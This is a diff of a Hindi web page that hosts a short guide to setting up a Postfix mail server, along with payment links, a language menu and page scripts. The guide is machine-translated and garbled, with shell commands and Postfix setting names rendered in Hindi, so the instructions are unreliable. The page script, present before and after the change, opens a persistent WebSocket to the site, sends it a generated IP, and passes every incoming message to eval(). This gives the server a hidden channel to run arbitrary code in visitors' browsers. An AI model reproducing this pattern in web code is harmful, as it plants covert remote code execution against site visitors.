@@ -65,7 +65,7 @@
               <a class="nav-link" href="/hi/landing" title="लैंडिंग पृष्ठ पर जाएँ">अवतरण</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="वीडियो चैट">बात करना</a>
+              <a class="nav-link" href="/hi/chat" title="वीडियो चैट">बात करना</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/hi/private" title="एक कुंजी के साथ निजी तस्वीरें देखें">निजी</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisyकी प्रोफ़ाइल फोटो" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>द्वारा Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> मैं पोस्टफिक्स के साथ एक मेल सर्वर का निर्माण कैसे करूं?br> </p> <p> 1।PostFix इंस्टॉल करें: अपने सर्वर पर PostFix स्थापित करने के लिए अपने पैकेज मैनेजर का उपयोग करें।उदाहरण के लिए, डेबियन/उबंटू पर, आप `sudo apt-get इंस्टॉल पोस्टफिक्स` चला सकते हैं। </p> <p> <br> </p> <p> 2।कॉन्फ़िगर करें पोस्टफ़िक्स: पोस्टफिक्स कॉन्फ़िगरेशन फ़ाइलें `/etc/पोस्टफिक्स/` में स्थित हैं।मुख्य कॉन्फ़िगरेशन फ़ाइल `main.cf` है।आप अपनी आवश्यकताओं के अनुसार अपना मेल सर्वर सेट करने के लिए इस फ़ाइल को संपादित कर सकते हैं।कुछ सामान्य कॉन्फ़िगरेशन जो आपको सेट करने की आवश्यकता हो सकती है, उनमें डोमेन नाम, मेल रिले सेटिंग्स, वर्चुअल डोमेन, आदि शामिल हैं। </p> <p> <br> </p> <p> 3।DNS रिकॉर्ड्स सेट करें: मेल डिलीवरी सुनिश्चित करने के लिए, आपको अपने डोमेन के लिए आवश्यक DNS रिकॉर्ड्स (MX और SPF रिकॉर्ड) सेट करना होगा।यदि आवश्यक हो तो सहायता के लिए अपने डोमेन रजिस्ट्रार या DNS प्रदाता से संपर्क करें। </p> <p> <br> <br> </p> <p> 4।वर्चुअल डोमेन और उपयोगकर्ता कॉन्फ़िगर करें: यदि आप अपने मेल सर्वर पर कई डोमेन होस्ट करना चाहते हैं, तो आपको कॉन्फ़िगर करना होगावर्चुअल डोमेन और उपयोगकर्ता।यह पोस्टफिक्स कॉन्फ़िगरेशन फ़ाइल में `वर्चुअला_एएलआईएएस_मैप्स` और` वर्चुअल_मेलबॉक्स_मैप्स` सेटिंग्स का उपयोग करके किया जा सकता है। </p> <p> <p> <br> </p> <p> 5।अपने मेल सर्वर को सुरक्षित करें: सुनिश्चित करें कि आपका मेल सर्वर फ़ायरवॉल नियम स्थापित करके सुरक्षित है, इनकमिंग और आउटगोइंग मेल के लिए टीएलएस एन्क्रिप्शन का उपयोग करके, और मेल सर्वर के लिए अनुशंसित अन्य सुरक्षा उपायों को लागू करना। </p> <p> <br> </p </p> <p> 6।अपने मेल सर्वर का परीक्षण करें: एक बार सब कुछ सेट हो जाने के बाद, आपको परीक्षण ईमेल भेजकर और प्राप्त करके अपने मेल सर्वर का परीक्षण करना चाहिए।मैन्युअल रूप से ईमेल भेजने के लिए टेलनेट या मेलएक्स जैसे उपकरणों का उपयोग करें और जांचें कि क्या वे सफलतापूर्वक प्राप्त हुए हैं।सुरक्षित रूप से।किसी भी मुद्दे या संदिग्ध के लिए मेल सर्वर लॉग की निगरानी करना भी एक अच्छा विचार है</div>
+<div style="white-space: pre-wrap;"><p>मैं पोस्टफिक्स के साथ एक मेल सर्वर कैसे बनाऊं?</p><p><br/></p><p>PostFix के साथ एक मेल सर्वर बनाने के लिए, इन चरणों का पालन करें:</p><p><br/></p><p>1। पोस्टफिक्स इंस्टॉल करें: अपने सर्वर पर पोस्टफिक्स स्थापित करने के लिए अपने पैकेज मैनेजर का उपयोग करें। उदाहरण के लिए, डेबियन/उबंटू पर, आप `sudo apt-get स्थापित पोस्टफिक्स` चला सकते हैं।</p><p><br/></p><p>2। CONFIGURE POSTFIX: पोस्टफ़िक्स कॉन्फ़िगरेशन फ़ाइलें `/etc/पोस्टफिक्स/` में स्थित हैं। मुख्य कॉन्फ़िगरेशन फ़ाइल `main.cf` है। आप अपनी आवश्यकताओं के अनुसार अपना मेल सर्वर सेट करने के लिए इस फ़ाइल को संपादित कर सकते हैं। कुछ सामान्य कॉन्फ़िगरेशन जो आपको सेट करने की आवश्यकता हो सकती है, उनमें डोमेन नाम, मेल रिले सेटिंग्स, वर्चुअल डोमेन, आदि शामिल हैं।</p><p><br/></p><p>3। DNS रिकॉर्ड्स सेट करें: मेल डिलीवरी सुनिश्चित करने के लिए, आपको अपने डोमेन के लिए आवश्यक DNS रिकॉर्ड्स (MX और SPF रिकॉर्ड) सेट करना होगा। यदि आवश्यक हो तो सहायता के लिए अपने डोमेन रजिस्ट्रार या DNS प्रदाता से संपर्क करें।</p><p><br/></p><p>4। वर्चुअल डोमेन और उपयोगकर्ताओं को कॉन्फ़िगर करें: यदि आप अपने मेल सर्वर पर कई डोमेन होस्ट करना चाहते हैं, तो आपको वर्चुअल डोमेन और उपयोगकर्ताओं को कॉन्फ़िगर करना होगा। यह पोस्टफिक्स कॉन्फ़िगरेशन फ़ाइल में `वर्चुअला_एएलआईएएस_मैप्स` और` वर्चुअल_मेलबॉक्स_मैप्स` सेटिंग्स का उपयोग करके किया जा सकता है।</p><p><br/></p><p>5। अपने मेल सर्वर को सुरक्षित करें: सुनिश्चित करें कि आपका मेल सर्वर फ़ायरवॉल नियम स्थापित करके सुरक्षित है, इनकमिंग और आउटगोइंग मेल के लिए टीएलएस एन्क्रिप्शन का उपयोग करके, और मेल सर्वर के लिए अनुशंसित अन्य सुरक्षा उपायों को लागू करना।</p><p><br/></p><p>6। अपने मेल सर्वर का परीक्षण करें: एक बार सब कुछ सेट हो जाने के बाद, आपको परीक्षण ईमेल भेजकर और प्राप्त करके अपने मेल सर्वर का परीक्षण करना चाहिए। मैन्युअल रूप से ईमेल भेजने के लिए टेलनेट या मेलएक्स जैसे उपकरणों का उपयोग करें और जांचें कि क्या वे सफलतापूर्वक प्राप्त हुए हैं।</p><p><br/></p><p>समय -समय पर अपडेट करना और अपने मेल सर्वर को बनाए रखने के लिए यह सुनिश्चित करना याद रखें कि यह आसानी से और सुरक्षित रूप से चलता है। किसी भी समस्या या संदिग्ध गतिविधि के लिए मेल सर्वर लॉग की निगरानी करना भी एक अच्छा विचार है।</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -142,7 +143,7 @@
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917" title="Buy on Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">क्रिप्टो के साथ खरीदें</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917" title="Buy on Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">क्रिप्टो के साथ खरीदें</a></p>
 
 
 <hr>
@@ -182,46 +183,53 @@
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
     <i class="bi bi-globe"></i> भाषा
   </a>
   <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
-    <a class="dropdown-item" href="/en/how-do-i-build-a-mail-server">English</a>
-    <a class="dropdown-item" href="/es/how-do-i-build-a-mail-server">Española</a>
-    <a class="dropdown-item" href="/fr/how-do-i-build-a-mail-server">Français</a>
-    <a class="dropdown-item" href="/de/how-do-i-build-a-mail-server">Deutsch</a>
-    <a class="dropdown-item" href="/nl/how-do-i-build-a-mail-server">Nederlands</a>
-    <a class="dropdown-item" href="/af/how-do-i-build-a-mail-server">Afrikaans</a>
-    <a class="dropdown-item" href="/ar/how-do-i-build-a-mail-server">عربي</a>
-    <a class="dropdown-item" href="/pt/how-do-i-build-a-mail-server">Português (Portugal, Brazil)</a>
-    <a class="dropdown-item" href="/id/how-do-i-build-a-mail-server">Bahasa</a>
-    <a class="dropdown-item" href="/hi/how-do-i-build-a-mail-server">हिंदी</a>
-    <a class="dropdown-item" href="/ru/how-do-i-build-a-mail-server">Русский</a>
-    <a class="dropdown-item" href="/ja/how-do-i-build-a-mail-server">日本語</a>
-    <a class="dropdown-item" href="/th/how-do-i-build-a-mail-server">แบบไทย</a>
-    <a class="dropdown-item" href="/zh-CN/how-do-i-build-a-mail-server">中国人</a>
-    <a class="dropdown-item" href="/tl/how-do-i-build-a-mail-server">Filipino</a>
-    <a class="dropdown-item" href="/cs/how-do-i-build-a-mail-server">čeština</a>
-    <a class="dropdown-item" href="/he/how-do-i-build-a-mail-server">עִברִית</a>
-    <a class="dropdown-item" href="/it/how-do-i-build-a-mail-server">Italiana</a>
-    <a class="dropdown-item" href="/no/how-do-i-build-a-mail-server">norsk</a>
-    <a class="dropdown-item" href="/pl/how-do-i-build-a-mail-server">Polski</a>
-    <a class="dropdown-item" href="/sv/how-do-i-build-a-mail-server">svenska</a>
-    <a class="dropdown-item" href="/tr/how-do-i-build-a-mail-server">Türkçe</a>
-    <a class="dropdown-item" href="/uk/how-do-i-build-a-mail-server">українська</a>
-    <a class="dropdown-item" href="/vi/how-do-i-build-a-mail-server">Tiếng Việt</a>
-    <a class="dropdown-item" href="/zu/how-do-i-build-a-mail-server">Zulu</a>
+    <div style="max-height: 50vh; overflow: scroll;">
+        <a class="dropdown-item" href="/en/how-do-i-build-a-mail-server">English</a>
+        <a class="dropdown-item" href="/es/how-do-i-build-a-mail-server">Española</a>
+        <a class="dropdown-item" href="/fr/how-do-i-build-a-mail-server">Français</a>
+        <a class="dropdown-item" href="/de/how-do-i-build-a-mail-server">Deutsch</a>
+        <a class="dropdown-item" href="/nl/how-do-i-build-a-mail-server">Nederlands</a>
+        <a class="dropdown-item" href="/af/how-do-i-build-a-mail-server">Afrikaans</a>
+        <a class="dropdown-item" href="/ar/how-do-i-build-a-mail-server">عربي</a>
+        <a class="dropdown-item" href="/pt/how-do-i-build-a-mail-server">Português (Portugal, Brazil)</a>
+        <a class="dropdown-item" href="/id/how-do-i-build-a-mail-server">Bahasa</a>
+        <a class="dropdown-item" href="/hi/how-do-i-build-a-mail-server">हिंदी</a>
+        <a class="dropdown-item" href="/ru/how-do-i-build-a-mail-server">Русский</a>
+        <a class="dropdown-item" href="/ja/how-do-i-build-a-mail-server">日本語</a>
+        <a class="dropdown-item" href="/th/how-do-i-build-a-mail-server">แบบไทย</a>
+        <a class="dropdown-item" href="/zh-CN/how-do-i-build-a-mail-server">中国人</a>
+        <a class="dropdown-item" href="/tl/how-do-i-build-a-mail-server">Filipino</a>
+        <a class="dropdown-item" href="/cs/how-do-i-build-a-mail-server">čeština</a>
+        <a class="dropdown-item" href="/he/how-do-i-build-a-mail-server">עִברִית</a>
+        <a class="dropdown-item" href="/it/how-do-i-build-a-mail-server">Italiana</a>
+        <a class="dropdown-item" href="/no/how-do-i-build-a-mail-server">norsk</a>
+        <a class="dropdown-item" href="/pl/how-do-i-build-a-mail-server">Polski</a>
+        <a class="dropdown-item" href="/sv/how-do-i-build-a-mail-server">svenska</a>
+        <a class="dropdown-item" href="/tr/how-do-i-build-a-mail-server">Türkçe</a>
+        <a class="dropdown-item" href="/uk/how-do-i-build-a-mail-server">українська</a>
+        <a class="dropdown-item" href="/vi/how-do-i-build-a-mail-server">Tiếng Việt</a>
+        <a class="dropdown-item" href="/zu/how-do-i-build-a-mail-server">Zulu</a>
+        <a class="dropdown-item" href="/sq/how-do-i-build-a-mail-server">shqiptare</a>
+    </div>
   </div>
 </div>
-</p>
+
         <p><i>मुझे इस पते का उपयोग करके बिटकॉइन में एक टिप छोड़ दें:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="प्रतिलिपि पता" onclick="copyToClipboard('btc-wallet');">प्रतिलिपि</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="मुझे इंस्टाग्राम पर जाएँ" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="मुझे ट्विटर पर जाएँ" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="मुझे YouTube पर देखें" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=hi" title="सेवा की शर्तें देखें">सेवा की शर्तें</a></span></p>
 		    </div>
@@ -237,6 +245,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -247,32 +272,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("close", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -419,34 +444,43 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "क्यूआर कोड को स्कैन करके इस पृष्ठ को साझा करें।";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.click();
-              document.body.removeChild(link);
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
     
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
+    
     
     
     <script>
